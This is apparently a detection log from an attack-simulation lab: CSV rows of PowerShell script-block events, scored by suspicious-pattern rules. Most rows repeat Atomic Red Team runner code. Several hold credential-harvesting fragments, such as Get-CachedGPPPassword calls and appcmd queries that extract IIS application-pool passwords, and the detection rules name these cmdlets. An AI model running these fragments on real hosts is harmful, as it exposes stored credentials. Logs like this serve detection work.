"12/16/2024 8:34:52 PM","35709159","2",", SuspiciousCmdlet, Get","SuspiciousCmdlet [Score: 1]; Get [Score: 1]","45","{ Get-CachedGPPPassword | Where-Object {$_} }","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'SuspiciousCmdlet' matched: 'Get-CachedGPPPassword'"
"12/16/2024 8:34:46 PM","35709147","2",", SuspiciousCmdlet, Get","SuspiciousCmdlet [Score: 1]; Get [Score: 1]","44","{ Get-SiteListPassword | Where-Object {$_} }","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'SuspiciousCmdlet' matched: 'Get-SiteListPassword'"
"12/16/2024 8:34:54 PM","35710559","2",", Get, SuspiciousKeyword","Get [Score: 1]; SuspiciousKeyword [Score: 1]","3188","function Invoke-KickoffAtomicRunner {

    #log rotation function
    function Rotate-Log {
        Param ($logPath, $max_filesize, $max_age)
        $datetime = Get-Date -uformat ""%Y-%m-%d-%H%M""

        $log = Get-Item $logPath
        if ($log.Length / 1MB -ge $max_filesize) {
            Write-Host ""file named $($log.name) is bigger than $max_filesize MB""
            $newname = ""$($log.Name)_${datetime}.arclog""
            Rename-Item $log.PSPath $newname
            Write-Host ""Done rotating file""
        }

        $logdir_content = Get-ChildItem $artConfig.atomicLogsPath -filter ""*.arclog""
        $cutoff_date = (get-date).AddDays($max_age)
        $logdir_content | ForEach-Object {
            if ($_.LastWriteTime -gt $cutoff_date) {
                Remove-Item $_
                Write-Host ""Removed $($_.PSPath)""
            }
        }
    }

    #Create log files as needed
    $all_log_file = Join-Path $artConfig.atomicLogsPath ""all-out-$($artConfig.basehostname).txt""
    $all_log_file_cleanup = Join-Path $artConfig.atomicLogsPath ""all-out-$($artConfig.basehostname)-cleanup.txt""
    New-Item $all_log_file -ItemType file -ErrorAction Ignore
    New-Item $all_log_file_cleanup -ItemType file -ErrorAction Ignore
    New-Item $artConfig.logFile -ItemType File -ErrorAction Ignore

    #Rotate logs based on FileSize and Date max_filesize
    $max_filesize = 200 #in MB
    $max_file_age = 30 #in days
    Rotate-Log $all_log_file $max_filesize $max_file_age
    Rotate-Log $all_log_file_cleanup $max_filesize $max_file_age

    Rotate-Log $artConfig.logFile $max_filesize $max_file_age #no need to repeat this. Can reduce further.

    # Optional additional delay before starting
    Start-Sleep $artConfig.kickOffDelay.TotalSeconds

    $WorkingDirectory = if ($IsLinux -or $IsMacOS) { ""/tmp"" } else { $env:TEMP }
    $FileName = if ($IsLinux -or $IsMacOS) { ""pwsh"" } else { ""powershell.exe"" }
    if ($artConfig.debug) { $Arguments = ""-Command Invoke-AtomicRunner *>> $all_log_file"" } else { $Arguments = ""-Command Invoke-AtomicRunner"" }
    # Invoke the atomic as its own process because we don't want to skip the cleanup and rename process in the event that AV kills the process running the atomic
    $p1 = Start-Process -FilePath $FileName -ArgumentList $Arguments -WorkingDirectory $WorkingDirectory -PassThru

    if ($artConfig.debug) { $Arguments = ""-Command Invoke-AtomicRunner -scheduledTaskCleanup *>> $all_log_file_cleanup"" } else { $Arguments = ""-Command Invoke-AtomicRunner -scheduledTaskCleanup"" }
    $p2 = Start-Process -FilePath $FileName -ArgumentList $Arguments -WorkingDirectory $WorkingDirectory -PassThru

    return $p1,$p2

}

function LogRunnerMsg ($message) {
    $mutexName = 'AtomicRunnerLoggingMutex'
    $mutex = New-Object 'Threading.Mutex' $false, $mutexName
    # Grab the mutex. Will block until this process has it.
    $mutex.WaitOne() | Out-Null
    try {
        # OK. Now it is safe to write to your log file
        $now = ""[{0:MM/dd/yy} {0:HH:mm:ss}]"" -f (Get-Date)
        Write-Host -fore cyan $message
        Add-Content $artConfig.logFile ""$now`: $message""
    }
    finally {
        $mutex.ReleaseMutex()
    }
}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'Get' matched: 'get-'
Pattern 'SuspiciousKeyword' matched: 'Start-Process'
Pattern 'SuspiciousKeyword' matched: 'Start-Process'"
"12/16/2024 8:34:46 PM","35709089","2",", IEX","IEX [Score: 2]","815","{

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = ""$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool "" + ""`""$PoolName`"" /text:processmodel.username""
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = ""$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool "" + ""`""$PoolName`"" /text:processmodel.password""
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne """") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'IEX' matched: 'Invoke-Expression'
Pattern 'IEX' matched: 'Invoke-Expression'"
"12/16/2024 8:34:46 PM","35709085","2",", SuspiciousCmdlet, Get","SuspiciousCmdlet [Score: 1]; Get [Score: 1]","43","{ Get-ApplicationHost | Where-Object {$_} }","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'SuspiciousCmdlet' matched: 'Get-ApplicationHost'"
"12/16/2024 8:34:55 PM","35710698","2",", Get, SuspiciousKeyword","Get [Score: 1]; SuspiciousKeyword [Score: 1]","3188","function Invoke-KickoffAtomicRunner {

    #log rotation function
    function Rotate-Log {
        Param ($logPath, $max_filesize, $max_age)
        $datetime = Get-Date -uformat ""%Y-%m-%d-%H%M""

        $log = Get-Item $logPath
        if ($log.Length / 1MB -ge $max_filesize) {
            Write-Host ""file named $($log.name) is bigger than $max_filesize MB""
            $newname = ""$($log.Name)_${datetime}.arclog""
            Rename-Item $log.PSPath $newname
            Write-Host ""Done rotating file""
        }

        $logdir_content = Get-ChildItem $artConfig.atomicLogsPath -filter ""*.arclog""
        $cutoff_date = (get-date).AddDays($max_age)
        $logdir_content | ForEach-Object {
            if ($_.LastWriteTime -gt $cutoff_date) {
                Remove-Item $_
                Write-Host ""Removed $($_.PSPath)""
            }
        }
    }

    #Create log files as needed
    $all_log_file = Join-Path $artConfig.atomicLogsPath ""all-out-$($artConfig.basehostname).txt""
    $all_log_file_cleanup = Join-Path $artConfig.atomicLogsPath ""all-out-$($artConfig.basehostname)-cleanup.txt""
    New-Item $all_log_file -ItemType file -ErrorAction Ignore
    New-Item $all_log_file_cleanup -ItemType file -ErrorAction Ignore
    New-Item $artConfig.logFile -ItemType File -ErrorAction Ignore

    #Rotate logs based on FileSize and Date max_filesize
    $max_filesize = 200 #in MB
    $max_file_age = 30 #in days
    Rotate-Log $all_log_file $max_filesize $max_file_age
    Rotate-Log $all_log_file_cleanup $max_filesize $max_file_age

    Rotate-Log $artConfig.logFile $max_filesize $max_file_age #no need to repeat this. Can reduce further.

    # Optional additional delay before starting
    Start-Sleep $artConfig.kickOffDelay.TotalSeconds

    $WorkingDirectory = if ($IsLinux -or $IsMacOS) { ""/tmp"" } else { $env:TEMP }
    $FileName = if ($IsLinux -or $IsMacOS) { ""pwsh"" } else { ""powershell.exe"" }
    if ($artConfig.debug) { $Arguments = ""-Command Invoke-AtomicRunner *>> $all_log_file"" } else { $Arguments = ""-Command Invoke-AtomicRunner"" }
    # Invoke the atomic as its own process because we don't want to skip the cleanup and rename process in the event that AV kills the process running the atomic
    $p1 = Start-Process -FilePath $FileName -ArgumentList $Arguments -WorkingDirectory $WorkingDirectory -PassThru

    if ($artConfig.debug) { $Arguments = ""-Command Invoke-AtomicRunner -scheduledTaskCleanup *>> $all_log_file_cleanup"" } else { $Arguments = ""-Command Invoke-AtomicRunner -scheduledTaskCleanup"" }
    $p2 = Start-Process -FilePath $FileName -ArgumentList $Arguments -WorkingDirectory $WorkingDirectory -PassThru

    return $p1,$p2

}

function LogRunnerMsg ($message) {
    $mutexName = 'AtomicRunnerLoggingMutex'
    $mutex = New-Object 'Threading.Mutex' $false, $mutexName
    # Grab the mutex. Will block until this process has it.
    $mutex.WaitOne() | Out-Null
    try {
        # OK. Now it is safe to write to your log file
        $now = ""[{0:MM/dd/yy} {0:HH:mm:ss}]"" -f (Get-Date)
        Write-Host -fore cyan $message
        Add-Content $artConfig.logFile ""$now`: $message""
    }
    finally {
        $mutex.ReleaseMutex()
    }
}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'Get' matched: 'get-'
Pattern 'SuspiciousKeyword' matched: 'Start-Process'
Pattern 'SuspiciousKeyword' matched: 'Start-Process'"
"12/16/2024 8:34:55 PM","35710828","2",", SuspiciousKeyword, Reflection","SuspiciousKeyword [Score: 1]; Reflection [Score: 1]","831","function Load-Assembly {
    $libDir = Join-Path $here ""lib""
    $assemblies = @{
        ""core"" = Join-Path $libDir ""netstandard2.1\YamlDotNet.dll"";
        ""net45"" = Join-Path $libDir ""net45\YamlDotNet.dll"";
        ""net35"" = Join-Path $libDir ""net35\YamlDotNet.dll"";
    }

    if ($PSVersionTable.Keys -contains ""PSEdition"") {
        if ($PSVersionTable.PSEdition -eq ""Core"") {
            return [Reflection.Assembly]::LoadFrom($assemblies[""core""])
        } elseif ($PSVersionTable.PSVersion.Major -ge 4) {
            return [Reflection.Assembly]::LoadFrom($assemblies[""net45""])
        } else {
            return [Reflection.Assembly]::LoadFrom($assemblies[""net35""])
        }
    } else { # Powershell 4.0 and lower do not know ""PSEdition"" yet
        return [Reflection.Assembly]::LoadFrom($assemblies[""net35""])
    }
}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'
Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'
Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'
Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'"
"12/16/2024 8:34:54 PM","35710498","2",", SuspiciousKeyword, Reflection","SuspiciousKeyword [Score: 1]; Reflection [Score: 1]","831","function Load-Assembly {
    $libDir = Join-Path $here ""lib""
    $assemblies = @{
        ""core"" = Join-Path $libDir ""netstandard2.1\YamlDotNet.dll"";
        ""net45"" = Join-Path $libDir ""net45\YamlDotNet.dll"";
        ""net35"" = Join-Path $libDir ""net35\YamlDotNet.dll"";
    }

    if ($PSVersionTable.Keys -contains ""PSEdition"") {
        if ($PSVersionTable.PSEdition -eq ""Core"") {
            return [Reflection.Assembly]::LoadFrom($assemblies[""core""])
        } elseif ($PSVersionTable.PSVersion.Major -ge 4) {
            return [Reflection.Assembly]::LoadFrom($assemblies[""net45""])
        } else {
            return [Reflection.Assembly]::LoadFrom($assemblies[""net35""])
        }
    } else { # Powershell 4.0 and lower do not know ""PSEdition"" yet
        return [Reflection.Assembly]::LoadFrom($assemblies[""net35""])
    }
}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'
Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'
Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'
Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'"
"12/16/2024 8:34:46 PM","35709125","2",", IEX","IEX [Score: 2]","785","{

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = ""$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir "" + ""`""$VdirName`"" /text:userName""
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = ""$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir "" + ""`""$VdirName`"" /text:password""
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne """") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'IEX' matched: 'Invoke-Expression'
Pattern 'IEX' matched: 'Invoke-Expression'"
"12/16/2024 8:34:45 PM","35709040","2",", SuspiciousCmdlet, Get","SuspiciousCmdlet [Score: 1]; Get [Score: 1]","29","{ Get-UnattendedInstallFile }","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'SuspiciousCmdlet' matched: 'Get-UnattendedInstallFile'"
"12/16/2024 8:34:56 PM","35710889","2",", Get, SuspiciousKeyword","Get [Score: 1]; SuspiciousKeyword [Score: 1]","3188","function Invoke-KickoffAtomicRunner {

    #log rotation function
    function Rotate-Log {
        Param ($logPath, $max_filesize, $max_age)
        $datetime = Get-Date -uformat ""%Y-%m-%d-%H%M""

        $log = Get-Item $logPath
        if ($log.Length / 1MB -ge $max_filesize) {
            Write-Host ""file named $($log.name) is bigger than $max_filesize MB""
            $newname = ""$($log.Name)_${datetime}.arclog""
            Rename-Item $log.PSPath $newname
            Write-Host ""Done rotating file""
        }

        $logdir_content = Get-ChildItem $artConfig.atomicLogsPath -filter ""*.arclog""
        $cutoff_date = (get-date).AddDays($max_age)
        $logdir_content | ForEach-Object {
            if ($_.LastWriteTime -gt $cutoff_date) {
                Remove-Item $_
                Write-Host ""Removed $($_.PSPath)""
            }
        }
    }

    #Create log files as needed
    $all_log_file = Join-Path $artConfig.atomicLogsPath ""all-out-$($artConfig.basehostname).txt""
    $all_log_file_cleanup = Join-Path $artConfig.atomicLogsPath ""all-out-$($artConfig.basehostname)-cleanup.txt""
    New-Item $all_log_file -ItemType file -ErrorAction Ignore
    New-Item $all_log_file_cleanup -ItemType file -ErrorAction Ignore
    New-Item $artConfig.logFile -ItemType File -ErrorAction Ignore

    #Rotate logs based on FileSize and Date max_filesize
    $max_filesize = 200 #in MB
    $max_file_age = 30 #in days
    Rotate-Log $all_log_file $max_filesize $max_file_age
    Rotate-Log $all_log_file_cleanup $max_filesize $max_file_age

    Rotate-Log $artConfig.logFile $max_filesize $max_file_age #no need to repeat this. Can reduce further.

    # Optional additional delay before starting
    Start-Sleep $artConfig.kickOffDelay.TotalSeconds

    $WorkingDirectory = if ($IsLinux -or $IsMacOS) { ""/tmp"" } else { $env:TEMP }
    $FileName = if ($IsLinux -or $IsMacOS) { ""pwsh"" } else { ""powershell.exe"" }
    if ($artConfig.debug) { $Arguments = ""-Command Invoke-AtomicRunner *>> $all_log_file"" } else { $Arguments = ""-Command Invoke-AtomicRunner"" }
    # Invoke the atomic as its own process because we don't want to skip the cleanup and rename process in the event that AV kills the process running the atomic
    $p1 = Start-Process -FilePath $FileName -ArgumentList $Arguments -WorkingDirectory $WorkingDirectory -PassThru

    if ($artConfig.debug) { $Arguments = ""-Command Invoke-AtomicRunner -scheduledTaskCleanup *>> $all_log_file_cleanup"" } else { $Arguments = ""-Command Invoke-AtomicRunner -scheduledTaskCleanup"" }
    $p2 = Start-Process -FilePath $FileName -ArgumentList $Arguments -WorkingDirectory $WorkingDirectory -PassThru

    return $p1,$p2

}

function LogRunnerMsg ($message) {
    $mutexName = 'AtomicRunnerLoggingMutex'
    $mutex = New-Object 'Threading.Mutex' $false, $mutexName
    # Grab the mutex. Will block until this process has it.
    $mutex.WaitOne() | Out-Null
    try {
        # OK. Now it is safe to write to your log file
        $now = ""[{0:MM/dd/yy} {0:HH:mm:ss}]"" -f (Get-Date)
        Write-Host -fore cyan $message
        Add-Content $artConfig.logFile ""$now`: $message""
    }
    finally {
        $mutex.ReleaseMutex()
    }
}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'Get' matched: 'get-'
Pattern 'SuspiciousKeyword' matched: 'Start-Process'
Pattern 'SuspiciousKeyword' matched: 'Start-Process'"
"12/16/2024 8:34:56 PM","35711015","2",", SuspiciousKeyword, Reflection","SuspiciousKeyword [Score: 1]; Reflection [Score: 1]","831","function Load-Assembly {
    $libDir = Join-Path $here ""lib""
    $assemblies = @{
        ""core"" = Join-Path $libDir ""netstandard2.1\YamlDotNet.dll"";
        ""net45"" = Join-Path $libDir ""net45\YamlDotNet.dll"";
        ""net35"" = Join-Path $libDir ""net35\YamlDotNet.dll"";
    }

    if ($PSVersionTable.Keys -contains ""PSEdition"") {
        if ($PSVersionTable.PSEdition -eq ""Core"") {
            return [Reflection.Assembly]::LoadFrom($assemblies[""core""])
        } elseif ($PSVersionTable.PSVersion.Major -ge 4) {
            return [Reflection.Assembly]::LoadFrom($assemblies[""net45""])
        } else {
            return [Reflection.Assembly]::LoadFrom($assemblies[""net35""])
        }
    } else { # Powershell 4.0 and lower do not know ""PSEdition"" yet
        return [Reflection.Assembly]::LoadFrom($assemblies[""net35""])
    }
}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'
Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'
Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'
Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'"
"12/16/2024 8:34:57 PM","35711077","2",", Get, SuspiciousKeyword","Get [Score: 1]; SuspiciousKeyword [Score: 1]","3188","function Invoke-KickoffAtomicRunner {

    #log rotation function
    function Rotate-Log {
        Param ($logPath, $max_filesize, $max_age)
        $datetime = Get-Date -uformat ""%Y-%m-%d-%H%M""

        $log = Get-Item $logPath
        if ($log.Length / 1MB -ge $max_filesize) {
            Write-Host ""file named $($log.name) is bigger than $max_filesize MB""
            $newname = ""$($log.Name)_${datetime}.arclog""
            Rename-Item $log.PSPath $newname
            Write-Host ""Done rotating file""
        }

        $logdir_content = Get-ChildItem $artConfig.atomicLogsPath -filter ""*.arclog""
        $cutoff_date = (get-date).AddDays($max_age)
        $logdir_content | ForEach-Object {
            if ($_.LastWriteTime -gt $cutoff_date) {
                Remove-Item $_
                Write-Host ""Removed $($_.PSPath)""
            }
        }
    }

    #Create log files as needed
    $all_log_file = Join-Path $artConfig.atomicLogsPath ""all-out-$($artConfig.basehostname).txt""
    $all_log_file_cleanup = Join-Path $artConfig.atomicLogsPath ""all-out-$($artConfig.basehostname)-cleanup.txt""
    New-Item $all_log_file -ItemType file -ErrorAction Ignore
    New-Item $all_log_file_cleanup -ItemType file -ErrorAction Ignore
    New-Item $artConfig.logFile -ItemType File -ErrorAction Ignore

    #Rotate logs based on FileSize and Date max_filesize
    $max_filesize = 200 #in MB
    $max_file_age = 30 #in days
    Rotate-Log $all_log_file $max_filesize $max_file_age
    Rotate-Log $all_log_file_cleanup $max_filesize $max_file_age

    Rotate-Log $artConfig.logFile $max_filesize $max_file_age #no need to repeat this. Can reduce further.

    # Optional additional delay before starting
    Start-Sleep $artConfig.kickOffDelay.TotalSeconds

    $WorkingDirectory = if ($IsLinux -or $IsMacOS) { ""/tmp"" } else { $env:TEMP }
    $FileName = if ($IsLinux -or $IsMacOS) { ""pwsh"" } else { ""powershell.exe"" }
    if ($artConfig.debug) { $Arguments = ""-Command Invoke-AtomicRunner *>> $all_log_file"" } else { $Arguments = ""-Command Invoke-AtomicRunner"" }
    # Invoke the atomic as its own process because we don't want to skip the cleanup and rename process in the event that AV kills the process running the atomic
    $p1 = Start-Process -FilePath $FileName -ArgumentList $Arguments -WorkingDirectory $WorkingDirectory -PassThru

    if ($artConfig.debug) { $Arguments = ""-Command Invoke-AtomicRunner -scheduledTaskCleanup *>> $all_log_file_cleanup"" } else { $Arguments = ""-Command Invoke-AtomicRunner -scheduledTaskCleanup"" }
    $p2 = Start-Process -FilePath $FileName -ArgumentList $Arguments -WorkingDirectory $WorkingDirectory -PassThru

    return $p1,$p2

}

function LogRunnerMsg ($message) {
    $mutexName = 'AtomicRunnerLoggingMutex'
    $mutex = New-Object 'Threading.Mutex' $false, $mutexName
    # Grab the mutex. Will block until this process has it.
    $mutex.WaitOne() | Out-Null
    try {
        # OK. Now it is safe to write to your log file
        $now = ""[{0:MM/dd/yy} {0:HH:mm:ss}]"" -f (Get-Date)
        Write-Host -fore cyan $message
        Add-Content $artConfig.logFile ""$now`: $message""
    }
    finally {
        $mutex.ReleaseMutex()
    }
}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'Get' matched: 'get-'
Pattern 'SuspiciousKeyword' matched: 'Start-Process'
Pattern 'SuspiciousKeyword' matched: 'Start-Process'"
"12/16/2024 8:34:56 PM","35710851","1",", Get","Get [Score: 1]","1359","function Start-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $commandLine, $isWindows) {

}

function Write-ExecutionLog($startTime, $stopTime, $technique, $testNum, $testName, $testGuid, $testExecutor, $testDescription, $command, $logPath, $targetHostname, $targetUser, $res, $isWindows) {
    if (!(Test-Path $logPath)) {
        New-Item $logPath -Force -ItemType File | Out-Null
    }
    $ipAddress = Get-PreferredIPAddress $isWindows
    $timeUTC = (Get-Date($startTime).toUniversalTime() -uformat ""%Y-%m-%dT%H:%M:%SZ"").ToString()
    $timeLocal = (Get-Date($startTime) -uformat ""%Y-%m-%dT%H:%M:%SZ"").ToString()
    $msg = [PSCustomObject][ordered]@{
        ""Execution Time (UTC)""   = $timeUTC
        ""Execution Time (Local)"" = $timeLocal
        ""Technique""              = $technique
        ""Test Number""            = $testNum
        ""Test Name""              = $testName
        ""Hostname""               = $targetHostname
        ""IP Address""             = $ipAddress
        ""Username""               = $targetUser
        ""GUID""                   = $testGuid
        ""ProcessId""              = $res.ProcessId
        ""ExitCode""               = $res.ExitCode
    }

    $msg | Export-Csv -Path $LogPath -NoTypeInformation -Append
}

function Stop-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $isWindows) {

}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:54 PM","35710552","1",", Get","Get [Score: 1]","18431","function Invoke-AtomicTest {
    [CmdletBinding(DefaultParameterSetName = 'technique',
        SupportsShouldProcess = $true,
        PositionalBinding = $false,
        ConfirmImpact = 'Medium')]
    Param(
        [Parameter(Mandatory = $true,
            Position = 0,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $AtomicTechnique,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $ShowDetails,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $ShowDetailsBrief,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $anyOS,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [String[]]
        $TestNumbers,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [String[]]
        $TestNames,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [String[]]
        $TestGuids,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [String]
        $PathToAtomicsFolder = $( if ($IsLinux -or $IsMacOS) { $Env:HOME + ""/AtomicRedTeam/atomics"" } else { $env:HOMEDRIVE + ""\AtomicRedTeam\atomics"" }),

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $CheckPrereqs = $false,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $PromptForInputArgs = $false,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $GetPrereqs = $false,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $Cleanup = $false,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [switch]
        $NoExecutionLog = $false,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [String]
        $ExecutionLogPath = $( if ($IsLinux -or $IsMacOS) { ""/tmp/Invoke-AtomicTest-ExecutionLog.csv"" } else { ""$env:TEMP\Invoke-AtomicTest-ExecutionLog.csv"" }),

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [switch]
        $Force,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [HashTable]
        $InputArgs,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [Int]
        $TimeoutSeconds = 120,

        [Parameter(Mandatory = $false, ParameterSetName = 'technique')]
        [System.Management.Automation.Runspaces.PSSession[]]$Session,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $Interactive = $false,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $KeepStdOutStdErrFiles = $false,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [String]
        $LoggingModule,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [switch]
        $SupressPathToAtomicsFolder = $false

    )
    BEGIN { } # Intentionally left blank and can be removed
    PROCESS {
        function ConvertTo-LoggerArray {
            param (
                [Parameter(Mandatory = $true)]
                [string]$Loggers
            )

            return $Loggers -split ',' | ForEach-Object { $_.Trim() }
        }

        $PathToAtomicsFolder = (Resolve-Path $PathToAtomicsFolder).Path

        Write-Verbose -Message 'Attempting to run Atomic Techniques'
        if (-not $supressPathToAtomicsFolder) { Write-Host -ForegroundColor Cyan ""PathToAtomicsFolder = $PathToAtomicsFolder`n"" }

        $executionPlatform, $isElevated, $tmpDir, $executionHostname, $executionUser = Get-TargetInfo $Session
        $PathToPayloads = if ($Session) { ""$tmpDir`AtomicRedTeam"" }  else { $PathToAtomicsFolder }

        # Since there might a comma(T1559-1,2,3) Powershell takes it as array.
        # So converting it back to string.
        if ($AtomicTechnique -is [array]) {
            $AtomicTechnique = $AtomicTechnique -join "",""
        }

        # Splitting Atomic Technique short form into technique and test numbers.
        $AtomicTechniqueParams = ($AtomicTechnique -split '-')
        $AtomicTechnique = $AtomicTechniqueParams[0]

        if ($AtomicTechniqueParams.Length -gt 1) {
            $ShortTestNumbers = $AtomicTechniqueParams[-1]
        }

        if ($null -eq $TestNumbers -and $null -ne $ShortTestNumbers) {
            $TestNumbers = $ShortTestNumbers -split ','
        }

        $isLoggingModuleSet = $false
        if (-not $NoExecutionLog) {
            $isLoggingModuleSet = $true
            if (-not $PSBoundParameters.ContainsKey('LoggingModule')) {
                # no logging module explicitly set
                # syslog logger
                $syslogOptionsSet = [bool]$artConfig.syslogServer -and [bool]$artConfig.syslogPort
                if ( $artConfig.LoggingModule -eq ""Syslog-ExecutionLogger"" -or (($artConfig.LoggingModule -eq '') -and $syslogOptionsSet) ) {
                    if ($syslogOptionsSet) {
                        $LoggingModule = ""Syslog-ExecutionLogger""
                    }
                    else {
                        Write-Host -Fore Yellow ""Config.ps1 specified: Syslog-ExecutionLogger, but the syslogServer and syslogPort must be specified. Using the default logger instead""
                        $LoggingModule = ""Default-ExecutionLogger""
                    }
                }
                elseif (-not [bool]$artConfig.LoggingModule) {
                    # loggingModule is blank (not set), so use the default logger
                    $LoggingModule = ""Default-ExecutionLogger""
                }
                else {
                    $LoggingModule = $artConfig.LoggingModule
                }
            }
        }

        if ($isLoggingModuleSet) {
            ConvertTo-LoggerArray $LoggingModule | ForEach-Object {
                if (Get-Module -name $_) {
                    Write-Verbose ""Using Logger: $_""
                }
                else {
                    Write-Host -Fore Yellow ""Logger not found: "", $_
                }

                # Change the defult logFile extension from csv to json and add a timestamp if using the Attire-ExecutionLogger
                if ($_ -eq ""Attire-ExecutionLogger"") { $ExecutionLogPath = $ExecutionLogPath.Replace(""Invoke-AtomicTest-ExecutionLog.csv"", ""Invoke-AtomicTest-ExecutionLog-timestamp.json"") }
                $ExecutionLogPath = $ExecutionLogPath.Replace(""timestamp"", $(Get-Date -UFormat %s))

                if (Get-Command ""$_\Start-ExecutionLog"" -erroraction silentlycontinue) {
                    if (Get-Command ""$_\Write-ExecutionLog"" -erroraction silentlycontinue) {
                        if (Get-Command ""$_\Stop-ExecutionLog"" -erroraction silentlycontinue) {
                            Write-Verbose ""All logging commands found""
                        }
                        else {
                            Write-Host ""Stop-ExecutionLog not found or loaded from the wrong module""
                            return
                        }
                    }
                    else {
                        Write-Host ""Write-ExecutionLog not found or loaded from the wrong module""
                        return
                    }
                }
                else {
                    Write-Host ""Start-ExecutionLog not found or loaded from the wrong module""
                    return
                }
            }

            # Here we're rebuilding an equivalent command line to put in the logs
            $commandLine = ""Invoke-AtomicTest $AtomicTechnique""

            if ($ShowDetails -ne $false) {
                $commandLine = ""$commandLine -ShowDetails $ShowDetails""
            }

            if ($ShowDetailsBrief -ne $false) {
                $commandLine = ""$commandLine -ShowDetailsBrief $ShowDetailsBrief""
            }

            if ($null -ne $TestNumbers) {
                $commandLine = ""$commandLine -TestNumbers $TestNumbers""
            }

            if ($null -ne $TestNames) {
                $commandLine = ""$commandLine -TestNames $TestNames""
            }

            if ($null -ne $TestGuids) {
                $commandLine = ""$commandLine -TestGuids $TestGuids""
            }

            $commandLine = ""$commandLine -PathToAtomicsFolder $PathToAtomicsFolder""

            if ($CheckPrereqs -ne $false) {
                $commandLine = ""$commandLine -CheckPrereqs $CheckPrereqs""
            }

            if ($PromptForInputArgs -ne $false) {
                $commandLine = ""$commandLine -PromptForInputArgs $PromptForInputArgs""
            }

            if ($GetPrereqs -ne $false) {
